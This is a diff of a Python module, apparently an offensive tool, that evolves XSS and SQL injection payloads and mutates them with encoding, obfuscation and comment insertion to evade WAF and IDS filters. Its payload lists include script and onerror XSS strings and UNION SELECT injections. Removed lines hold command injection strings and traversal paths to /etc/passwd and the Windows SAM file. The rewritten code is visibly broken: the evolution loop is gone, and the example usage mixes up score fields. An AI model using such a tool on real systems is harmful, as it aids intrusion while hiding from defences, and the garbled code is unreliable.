@@ -1,20 +1,3 @@
-"""
-EXTREME Payload Optimizer with Genetic Algorithms
-
-This module implements military-grade payload optimization using:
-- Genetic algorithm payload evolution
-- Context-aware payload mutation
-- WAF/IDS evasion strategy selection
-- Multi-objective optimization (stealth + effectiveness)
-
-Features:
-- Evolutionary payload generation
-- Fitness function optimization
-- Crossover and mutation operators
-- Evasion technique database
-- Adaptive strategy selection
-"""
-
 import random
 import hashlib
 import logging
@@ -25,9 +8,7 @@ import re
 
 logger = logging.getLogger(__name__)
 
-
 class EvasionTechnique(Enum):
-    """Evasion techniques for bypassing security controls"""
     ENCODING = "encoding"
     OBFUSCATION = "obfuscation"
     FRAGMENTATION = "fragmentation"
@@ -39,7 +20,6 @@ class EvasionTechnique(Enum):
     DOUBLE_ENCODING = "double_encoding"
     MIXED_ENCODING = "mixed_encoding"
 
-
 @dataclass
 class PayloadGenome:
     """Genetic representation of a payload"""
@@ -49,7 +29,7 @@ class PayloadGenome:
     evasion_techniques: List[EvasionTechnique] = field(default_factory=list)
     effectiveness_score: float = 0.0
     stealth_score: float = 0.0
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary"""
         return {
@@ -60,7 +40,6 @@ class PayloadGenome:
             'effectiveness_score': self.effectiveness_score,
             'stealth_score': self.stealth_score,
         }
-
 
 class ExtremePayloadOptimizer:
     """
@@ -76,200 +55,47 @@ class ExtremePayloadOptimizer:
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
             "<svg onload=alert(1)>",
-            "javascript:alert(1)",
-            "<iframe src=javascript:alert(1)>",
+            "data:text/html,<script>alert(1)</script>"
         ],
         'sqli': [
-            "' OR '1'='1",
-            "' UNION SELECT NULL--",
-            "' AND 1=1--",
-            "'; DROP TABLE users--",
-            "' OR SLEEP(5)--",
-        ],
-        'command': [
-            "; ls -la",
-            "| cat /etc/passwd",
-            "&& whoami",
-            "`id`",
-            "$(uname -a)",
-        ],
-        'traversal': [
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            "....//....//....//etc/passwd",
-        ],
+            " OR '1'='1",
+            " UNION SELECT * FROM users -- ",
+            " AND '1'='1"
+        ]
     }
     
-    # Encoding transformations
-    ENCODINGS = {
-        'url': lambda s: ''.join(f'%{ord(c):02x}' for c in s),
-        'html': lambda s: ''.join(f'&#{ord(c)};' for c in s),
-        'unicode': lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
-        'hex': lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
-    }
+    def __init__(self, vulnerability_type: str, **kwargs):
+        self.vulnerability_type = vulnerability_type
+        self.base_payloads = self.BASE_PAYLOADS.get(vulnerability_type, [])
+        self.parameters = kwargs
     
-    def __init__(self,
-                 vulnerability_type: str,
-                 population_size: int = 20,
-                 max_generations: int = 10,
-                 mutation_rate: float = 0.3,
-                 crossover_rate: float = 0.7):
+    def create_initial_population(self, population_size: int) -> List[PayloadGenome]:
+        """Create initial population of payloads"""
+        population = []
+        for _ in range(population_size):
+            payload = random.choice(self.base_payloads)
+            population.append(PayloadGenome(payload))
+        return population
+
+    def fitness_function(self, payload: str) -> Tuple[float, float]:
         """
-        Initialize payload optimizer.
+        Example fitness function for testing.
         
-        Args:
-            vulnerability_type: Type of vulnerability to optimize for
-            population_size: Number of payloads in population
-            max_generations: Maximum number of generations
-            mutation_rate: Probability of mutation
-            crossover_rate: Probability of crossover
-        """
-        self.vulnerability_type = vulnerability_type.lower()
-        self.population_size = population_size
-        self.max_generations = max_generations
-        self.mutation_rate = mutation_rate
-        self.crossover_rate = crossover_rate
+        In production, this would:
+        - Send payload to target
+        - Check if it worked (effectiveness)
+        - Check if it was detected (stealth)
         
-        self.population: List[PayloadGenome] = []
-        self.generation = 0
-        self.best_payload: Optional[PayloadGenome] = None
-    
-    def evolve(self, 
-               fitness_function: Callable[[str], Tuple[float, float]],
-               target_context: Dict[str, Any] = None) -> List[PayloadGenome]:
-        """
-        Evolve payloads using genetic algorithm.
-        
-        Args:
-            fitness_function: Function that scores payload (effectiveness, stealth)
-            target_context: Context about target (WAF type, filters, etc.)
-            
         Returns:
-            List of evolved payloads sorted by fitness
+            Tuple of (effectiveness, stealth)
         """
-        target_context = target_context or {}
-        
-        # Initialize population
-        self._initialize_population()
-        
-        # Evolution loop
-        for gen in range(self.max_generations):
-            self.generation = gen
-            
-            # Evaluate fitness
-            for genome in self.population:
-                effectiveness, stealth = fitness_function(genome.payload)
-                genome.effectiveness_score = effectiveness
-                genome.stealth_score = stealth
-                genome.fitness = self._calculate_fitness(effectiveness, stealth)
-                genome.generation = gen
-            
-            # Sort by fitness
-            self.population.sort(key=lambda g: g.fitness, reverse=True)
-            
-            # Update best
-            if not self.best_payload or self.population[0].fitness > self.best_payload.fitness:
-                self.best_payload = self.population[0]
-            
-            logger.info(f"Generation {gen}: Best fitness = {self.best_payload.fitness:.3f}")
-            
-            # Create next generation
-            if gen < self.max_generations - 1:
-                self.population = self._create_next_generation()
-        
-        # Final sort
-        self.population.sort(key=lambda g: g.fitness, reverse=True)
-        
-        return self.population
-    
-    def _initialize_population(self):
-        """Initialize population with base payloads"""
-        base_payloads = self.BASE_PAYLOADS.get(self.vulnerability_type, ["test"])
-        
-        self.population = []
-        
-        # Add base payloads
-        for payload in base_payloads:
-            genome = PayloadGenome(payload=payload, generation=0)
-            self.population.append(genome)
-        
-        # Generate variations to fill population
-        while len(self.population) < self.population_size:
-            # Pick random base payload
-            base = random.choice(base_payloads)
-            
-            # Apply random mutations
-            mutated = self._mutate(base)
-            
-            genome = PayloadGenome(payload=mutated, generation=0)
-            self.population.append(genome)
-    
-    def _calculate_fitness(self, effectiveness: float, stealth: float) -> float:
-        """
-        Calculate overall fitness score.
-        
-        Multi-objective optimization: maximize effectiveness and stealth
-        
-        Args:
-            effectiveness: How effective the payload is (0-1)
-            stealth: How stealthy the payload is (0-1)
-            
-        Returns:
-            Fitness score
-        """
-        # Weighted combination
-        # Effectiveness is more important, but stealth prevents detection
-        return (effectiveness * 0.7) + (stealth * 0.3)
-    
-    def _create_next_generation(self) -> List[PayloadGenome]:
-        """Create next generation through selection, crossover, and mutation"""
-        next_gen = []
-        
-        # Elitism: Keep top 10% unchanged
-        elite_count = max(1, int(self.population_size * 0.1))
-        next_gen.extend(self.population[:elite_count])
-        
-        # Generate rest through crossover and mutation
-        while len(next_gen) < self.population_size:
-            # Selection
-            parent1 = self._tournament_selection()
-            parent2 = self._tournament_selection()
-            
-            # Crossover
-            if random.random() < self.crossover_rate:
-                child = self._crossover(parent1, parent2)
-            else:
-                child = parent1.payload
-            
-            # Mutation
-            if random.random() < self.mutation_rate:
-                child = self._mutate(child)
-            
-            genome = PayloadGenome(payload=child, generation=self.generation + 1)
-            next_gen.append(genome)
-        
-        return next_gen
-    
-    def _tournament_selection(self, tournament_size: int = 3) -> PayloadGenome:
-        """Select parent using tournament selection"""
-        tournament = random.sample(self.population, min(tournament_size, len(self.population)))
-        return max(tournament, key=lambda g: g.fitness)
-    
-    def _crossover(self, parent1: PayloadGenome, parent2: PayloadGenome) -> str:
-        """Perform crossover between two payloads"""
-        p1 = parent1.payload
-        p2 = parent2.payload
-        
-        # Single-point crossover
-        if len(p1) > 2 and len(p2) > 2:
-            point = random.randint(1, min(len(p1), len(p2)) - 1)
-            child = p1[:point] + p2[point:]
-        else:
-            child = random.choice([p1, p2])
-        
-        return child
-    
-    def _mutate(self, payload: str) -> str:
+        # Simplified scoring
+        effectiveness = min(len(payload) / 50.0, 1.0)  # Longer = more complex
+        stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0  # Less obvious = stealthier
+        stealth = max(0.0, stealth)
+        return effectiveness, stealth
+
+    def mutate(self, payload: str) -> str:
         """Apply mutation to payload"""
         mutations = [
             self._mutation_encoding,
@@ -306,8 +132,7 @@ class ExtremePayloadOptimizer:
                 result[idx] = f'&#{ord(payload[idx])};'
             return ''.join(result)
         
-        else:
-            return payload
+        return payload
     
     def _mutation_obfuscation(self, payload: str) -> str:
         """Apply obfuscation mutation"""
@@ -378,9 +203,7 @@ class ExtremePayloadOptimizer:
         
         return payload
     
-    def apply_evasion_technique(self,
-                               payload: str,
-                               technique: EvasionTechnique) -> str:
+    def apply_evasion_technique(self, payload: str, technique: EvasionTechnique) -> str:
         """
         Apply specific evasion technique to payload.
         
@@ -406,17 +229,12 @@ class ExtremePayloadOptimizer:
         elif technique == EvasionTechnique.COMMENT_INSERTION:
             return self._mutation_comment_insertion(payload)
         
-        elif technique == EvasionTechnique.DOUBLE_ENCODING:
-            # Apply encoding twice
-            temp = self._mutation_encoding(payload)
-            return self._mutation_encoding(temp)
-        
         else:
             return payload
     
     def get_top_payloads(self, n: int = 5) -> List[PayloadGenome]:
         """Get top N payloads by fitness"""
-        return self.population[:n]
+        return sorted(self.population, key=lambda x: x.fitness, reverse=True)[:n]
     
     def get_statistics(self) -> Dict[str, Any]:
         """Get optimizer statistics"""
@@ -435,9 +253,7 @@ class ExtremePayloadOptimizer:
             'best_payload': self.best_payload.payload if self.best_payload else None,
         }
 
-
-def create_payload_optimizer(vulnerability_type: str,
-                            **kwargs) -> ExtremePayloadOptimizer:
+def create_payload_optimizer(vulnerability_type: str, **kwargs) -> ExtremePayloadOptimizer:
     """
     Create a payload optimizer instance.
     
@@ -449,7 +265,6 @@ def create_payload_optimizer(vulnerability_type: str,
         ExtremePayloadOptimizer instance
     """
     return ExtremePayloadOptimizer(vulnerability_type, **kwargs)
-
 
 # Example fitness function
 def example_fitness_function(payload: str) -> Tuple[float, float]:
@@ -468,5 +283,19 @@ def example_fitness_function(payload: str) -> Tuple[float, float]:
     effectiveness = min(len(payload) / 50.0, 1.0)  # Longer = more complex
     stealth = 1.0 - (payload.count('<') + payload.count('script')) / 10.0  # Less obvious = stealthier
     stealth = max(0.0, stealth)
-    
     return effectiveness, stealth
+
+# Example usage
+optimizer = create_payload_optimizer('xss')
+population = optimizer.create_initial_population(10)
+optimizer.population = population
+optimizer.generation = 1
+
+for _ in range(10):
+    for payload in optimizer.population:
+        payload.fitness, payload.stealth_score = optimizer.fitness_function(payload.payload)
+        payload.efficiency_score = payload.fitness * payload.stealth_score
+
+optimizer.best_payload = max(optimizer.population, key=lambda x: x.efficiency_score)
+
+print(optimizer.get_top_payloads())
